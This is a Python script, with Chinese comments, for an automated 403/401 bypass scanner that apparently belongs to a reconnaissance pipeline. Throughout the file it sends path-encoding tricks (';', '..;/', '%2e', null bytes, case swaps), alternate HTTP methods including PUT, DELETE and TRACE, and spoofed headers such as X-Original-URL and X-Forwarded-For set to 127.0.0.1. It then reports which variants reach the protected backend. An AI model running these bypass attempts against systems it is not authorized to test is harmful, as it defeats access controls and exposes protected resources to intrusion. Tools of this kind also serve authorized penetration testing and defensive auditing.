#!/usr/bin/env python3
"""403 bypass: 对 403/401 的 URL 尝试路径/方法/Header 绕过。

发现可访问路径时产出 FINDING(记录绕过技术+状态码),并把明确成功的 URL 作为 URL 事件
输出供后续模块继续扫描。纯 stdlib(urllib + 线程池),无需外部工具。
"""
import argparse
import json
import sys
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlunparse

TIMEOUT = 10
CONCURRENCY = 8


def path_variants(path: str) -> list:
    """生成路径绕过变体(斜杠/点段/编码/路径参数/Tomcat/IIS 等)。"""
    p = path.strip("/")
    if not p:
        return ["/", "//", "/./", "/%2e/", "/;/", "/..;/"]
    seg = p.split("/")
    variants = [
        "/" + p + "/",
        "/" + p + "/.",
        "//" + p,
        "/./" + p,
        "/" + p + "/./",
        "/" + p + "..;/",
        "/" + p + ";",
        "/" + p + ";foo=bar",
        "/" + p + "%20",
        "/" + p + "%09",
        "/" + p + "%00",
        "/" + p + "%23",
        "/" + p + "%2e",
        "/" + p + "..%2f",
        "/" + p + ".json",
        "/" + p + ".html",
        "/" + p + "~",
        "/" + p + ".css",
        "/" + p + "/%2e%2e/",
        "/" + p + "%252f",
    ]
    if seg and seg[0]:
        variants.append("/" + "/".join([seg[0].upper()] + seg[1:]))
        variants.append("/" + "/".join([seg[0].swapcase()] + seg[1:]))
    return variants


def do_request(url: str, method: str = "GET", headers: dict = None):
    req = urllib.request.Request(url, headers=headers or {}, method=method)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.status
    except urllib.error.HTTPError as exc:
        try:
            exc.read()
        except Exception:
            pass
        return exc.code
    except Exception:
        return None


def is_bypass(status) -> bool:
    """脱离 403/401/404 即视为绕过(200/301/302/500/405 等都说明到达了后端)。404 是路径不存在,不算绕过。"""
    return status is not None and status not in (403, 401, 404)


def main() -> int:
    parser = argparse.ArgumentParser(description="403 bypass scanner")
    parser.add_argument("--url", required=True)
    args = parser.parse_args()
    url = args.url.strip()
    if not url.startswith(("http://", "https://")):
        print(f"[403bypass] invalid URL: {url!r}", file=sys.stderr)
        return 1

    parsed = urlparse(url)
    path = parsed.path or "/"
    scheme, netloc = parsed.scheme, parsed.netloc

    tasks = []  # (kind, url, method, headers, detail)
    for variant in path_variants(path):
        new_url = urlunparse((scheme, netloc, variant, parsed.params, parsed.query, parsed.fragment))
        if new_url != url:
            tasks.append(("path", new_url, "GET", None, variant))
    for method in ("POST", "PUT", "PATCH", "HEAD", "OPTIONS", "TRACE", "DELETE"):
        tasks.append(("method", url, method, None, method))
    header_payloads = [
        ("X-Original-URL", path),
        ("X-Rewrite-URL", path),
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Real-IP", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("X-Client-IP", "127.0.0.1"),
        ("True-Client-IP", "127.0.0.1"),
        ("X-Forwarded-Host", "localhost"),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("Referer", url),
        ("X-Forwarded-Scheme", "http"),
    ]
    for key, val in header_payloads:
        tasks.append(("header", url, "GET", {key: val}, key))

    findings = []
    found_urls = set()
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
        futures = {ex.submit(do_request, t[1], t[2], t[3]): t for t in tasks}
        for fut in as_completed(futures):
            kind, new_url, _method, _hdr, detail = futures[fut]
            status = fut.result()
            if is_bypass(status):
                findings.append((kind, detail, status, new_url))
                if kind == "path" and status in (200, 201, 204, 301, 302, 307):
                    found_urls.add(new_url)

    for kind, detail, status, new_url in findings:
        print(json.dumps({"FINDING": f"403bypass {kind}: {detail} -> {status} {new_url}"}, ensure_ascii=False), flush=True)
    for u in found_urls:
        print(json.dumps({"URL": u}, ensure_ascii=False), flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
